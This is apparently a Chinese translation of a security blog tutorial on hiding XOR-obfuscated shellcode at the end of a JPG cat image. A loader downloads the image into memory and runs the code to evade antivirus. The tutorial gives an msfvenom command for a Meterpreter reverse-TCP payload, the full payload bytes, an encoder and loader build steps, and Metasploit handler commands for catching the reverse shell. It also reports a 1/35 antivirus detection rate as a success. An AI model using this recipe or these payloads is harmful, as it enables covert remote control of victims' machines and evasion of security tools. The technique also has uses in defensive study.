> 原文链接: https://www.anquanke.com//post/id/85824 


# 【技术分享】如何从猫咪图片中加载运行shellcode


                                阅读量   
                                **146426**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[http://resources.infosecinstitute.com/launching-shellcode-cat-pictures/](http://resources.infosecinstitute.com/launching-shellcode-cat-pictures/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p2.ssl.qhimg.com/t0188c4ed59bb43fb58.png)](https://p2.ssl.qhimg.com/t0188c4ed59bb43fb58.png)**

****

翻译：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：190RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、前言**

猫咪是互联网的宠儿，这也是我为什么会考虑将猫咪和恶意软件联系在一起。

在某个偶然场合下，我接触到了一种比较特别的代码执行方法，其中涉及到某些可执行文件和一张图片。通常情况下，程序会下载图片文件，将该文件转化为可执行文件然后再运行。这种方法技术比较粗糙，可以在某些方面进行改进。

比如这种方法存在文件落盘行为，容易被反病毒软件检测出来。你可以通过内存执行方式来解决这个问题。然而，这么做的话你会遇到另一个问题，那就是你需要修改可执行文件中的IAT（Import Address Table，导入函数表）以及其他方面内容，因为可执行文件需要加载到其他程序的共享地址空间。

本文提出了一种方法，可以将shellcode嵌入到一张图片中，利用程序在堆中分配空间，下载远程图片然后执行图片中的shellcode。

这种方法使用内存运行方式，不容易被检测分析。在本文案例中，我们将使用一张JPG图片完成此项任务。

<br>

**二、环境准备**

你需要具备以下条件：

1、Windows系统

2、Linux工具

3、汇编知识

4、了解基本的MSFVenom载荷生成方法

5、编辑器：HexEditor（或[WxHexEditor](http://www.wxhexeditor.org/)）

6、安装GCC并添加到$PATH环境变量中

7、安装[Nasm](http://www.nasm.us/pub/nasm/releasebuilds/2.13rc6/)并添加到$PATH环境变量中

其他可选条件：

8、调试器：[Ollydbg](http://www.ollydbg.de/)或[x64dbg](http://x64dbg.com/)

9、将ASM指令转换为Op代码的工具。我使用的是Ram Michael的MultiLine Ultimate Assembler插件：[MUA插件](http://rammichael.com/tag/multimate-assembler)

<br>

**三、前期处理**

由于可执行文件的执行过程总是遵循从头部到尾部的顺序，因此我们需要掌握在内存中运行自定义载荷的方法。当你通过HTTP方式下载一个文件时，你会收到HTTP响应头和紧跟其后的文件内容。由于响应头位置靠前且大小不固定，我们难以预测需要跳转到哪个具体位置来执行代码。我们能做的就是将载荷信息放到图片尾部，将这段载荷拷贝到堆上的另一块内存空间，然后跳转到对应位置。

插入载荷后的图片二进制数据如下所示：

```
JPEG图片头：FF D8 FF E0 00 10
JFIF ASCII字符：4A 46 49 46
图片字节数据
图片字节数据
载荷尾部：CC CC CC CC
载荷中部：BB BB BB BB
载荷头部：AA AA AA AA
```

我们需要分配内存空间，跳转到载荷中的AA AA AA AA处并翻转载荷数据。载荷在内存中翻转后的内容如下：

```
载荷头部：AA AA AA AA
载荷中部：BB BB BB BB
载荷尾部：CC CC CC CC
```

这一步完成后，我们只要跳转到正确地址就能顺利运行载荷。

本例中，我编写了一个简单的混淆器，对载荷进行异或处理，通过混淆器还原并运行载荷。

这个[混淆器](https://github.com/ApertureSecurity/Assembly-Series/blob/master/LazyBitmaskEncoder.c)将载荷按WORD大小分割为多段数据，将FFFF添加到每段数据前头，通过逐位运算移除FFFF，将处理后的WORD添加到DWORD的第一部分，然后再添加下一个WORD数据到DWORD的第二部分。处理过程如下所示：

```
Mov eax, FFFFAABB    ; 将数据Move到EAX
And eax, FFFF        ; 移除头部的FFFF
Mov ebx, FFFFCCDD    ; 将数据Move到EBX
Mov ax, bx           ; EAX填充为AABBCCDD
Push eax             ; 压入栈中
Jmp esp              ; 跳转到载荷在栈中的地址并执行
```

出于混淆目的，我的代码中添加了一些异或处理过程，如果你有任何疑问，可以仔细研读代码并亲自动手试试代码的输出结果。

<br>

**四、开始工作**

我们先介绍一下如何使用MSFVENOM生成一段简单的载荷。你需要根据实际情况修改以下命令中的LPORT和LHOST参数值：

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=5555 -f c
```

输出结果如下所示，我标粗了其中的IP数据，以便读者替换为自己的IP（可以使用[IP/Hex Converter](http://ncalculators.com/digital-computation/ip-address-hex-decimal-binary.htm)这个工具）。

```
“xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8bx50x30”
“x8bx52x0cx8bx52x14x8bx72x28x0fxb7x4ax26x31xff”
“xacx3cx61x7cx02x2cx20xc1xcfx0dx01xc7xe2xf2x52”
“x57x8bx52x10x8bx4ax3cx8bx4cx11x78xe3x48x01xd1”
“x51x8bx59x20x01xd3x8bx49x18xe3x3ax49x8bx34x8b”
“x01xd6x31xffxacxc1xcfx0dx01xc7x38xe0x75xf6x03”
“x7dxf8x3bx7dx24x75xe4x58x8bx58x24x01xd3x66x8b”
“x0cx4bx8bx58x1cx01xd3x8bx04x8bx01xd0x89x44x24”
“x24x5bx5bx61x59x5ax51xffxe0x5fx5fx5ax8bx12xeb”
“x8dx5dx68x33x32x00x00x68x77x73x32x5fx54x68x4c”
“x77x26x07xffxd5xb8x90x01x00x00x29xc4x54x50x68”
“x29x80x6bx00xffxd5x6ax05x68x01x02x03x04x68x02″
“x00x15xb3x89xe6x50x50x50x50x40x50x40x50x68xea”
“x0fxdfxe0xffxd5x97x6ax10x56x57x68x99xa5x74x61”
“xffxd5x85xc0x74x0axffx4ex08x75xecxe8x61x00x00”
“x00x6ax00x6ax04x56x57x68x02xd9xc8x5fxffxd5x83”
“xf8x00x7ex36x8bx36x6ax40x68x00x10x00x00x56x6a”
“x00x68x58xa4x53xe5xffxd5x93x53x6ax00x56x53x57”
“x68x02xd9xc8x5fxffxd5x83xf8x00x7dx22x58x68x00”
“x40x00x00x6ax00x50x68x0bx2fx0fx30xffxd5x57x68”
“x75x6ex4dx61xffxd5x5ex5exffx0cx24xe9x71xffxff”
“xffx01xc3x29xc6x75xc7xc3xbbxf0xb5xa2x56x6ax00”
“x53xffxd5”;
```

在我的[混淆器](https://github.com/ApertureSecurity/Assembly-Series/blob/master/LazyBitmaskEncoder.c)中，将“SHELLCODE GOES HERE”这段替换为上述数据。使用如下gcc命令编译混淆器源码：

```
Gcc -std=c11 LazyBitmaskEncoder.c -o encoder.exe
```

将程序的输出结果导出到文件中：

```
encoder.exe &gt; somefile.txt
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh2.png)

在本文案例中，我有个值为31的额外字节，程序的警告信息提示我应该将它转化为经过异或处理的Nop指令（即7E），如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh3.png)

现在我们需要得到上述汇编代码的字节码，网上可能有在线工具将汇编语言转化为字节码，在这里我使用的是Ram Michael开发的用于OllyDbg或X64dbg的[MUA插件](http://rammichael.com/tag/multimate-assembler)，如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh4.png)

接下来我们选中这些字节码，在软件右键菜单中，选择“编辑”、“二进制拷贝”，将字节码拷贝出来。你也可以通过CTRL+INSERT组合键完成这个过程。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh5.png)

然后我们将这些字节码附到图片的尾部。如前文所述，我们需要以相反顺序将它们附到图像尾部。在Linux中，要做到这一点十分简单。

以下是未做顺序变换处理前的字节码数据。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh6.png)

我将这些数据保存到为“moo”文件，运行如下命令以获得正确顺序的数据。

```
for i in `cat moo` ; do echo $i;done| tac |sed ‘:a;N;$!ba;s/n/ /g’
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh7.png)

现在我们需要将处理后的数据插入到图片中。选一张你最中意的猫咪图片，我选了如下一张暹罗猫图片。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh8.jpg)

接下来是将那个shellcode拷贝到图片中。我们可以使用[WxHexEditor](http://www.wxhexeditor.org/)以二进制形式打开图片，复制图片中的字节数据。需要时刻提醒自己，载荷必须放在尾部，如果你发现载荷不在尾部，那么你需要填充多个0x90直到shellcode的起始位置。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh9.png)

图片尾部附加shellcode后如下图所示。保存为图片后，你会发现图像尾部存在一些微小的颜色失真现象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh10.png)

最后一个步骤，我们需要把这个图片放到Web服务器上，写个简单的程序，下载图片到内存中，跳转到正确地址，执行这段shellcode。最简单的一个方法还是通过汇编语言。

我写了一个[汇编程序](https://github.com/ApertureSecurity/Assembly-Series/blob/master/Ghostexe.asm)来完成这个任务。编译命令如下：

```
nasm -f win32 GhostExe.asm
gcc -fno-use-linker-plugin GhostExe.obj -o GhostExe.exe
```

我建议你可以打开调试器，将调试器附加到某个在运行的进程中，一步一步跟下来，观察它执行的步骤以加深理解。

如果你选择使用调试器，你可以看一下GhostExe.exe在00401482位置的偏移量，这是接收数据之后所在的位置。你可以在ECX的尾部看到输出的载荷数据。

或者你可以直接使用Metasploit，运行exe让它自动化执行。

```
msf&gt;use exploit multi/handler
msf&gt;set payload windows/meterpreter/reverse_tcp
msf&gt;set lhost &lt;local IP&gt;
msf&gt;set lport &lt;local port&gt;
msf&gt;set ExitOnSession false
msf&gt;exploit -j
```

以下是NoDistrubute.com给出的检测结果，只有1/35的检出率，非常好的一个结果。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh11.png)

<br>

**五、可选的调试步骤**

我们可以看看调试步骤的一些截图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh12.png)

定位到“JMP EAX”指令，这是我们从猫咪图片中跳转到shellcode的指令。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh13.png)

是不是很眼熟：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh14.png)

这就是我们原始的载荷：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/032117_2306_LaunchingSh15.png)
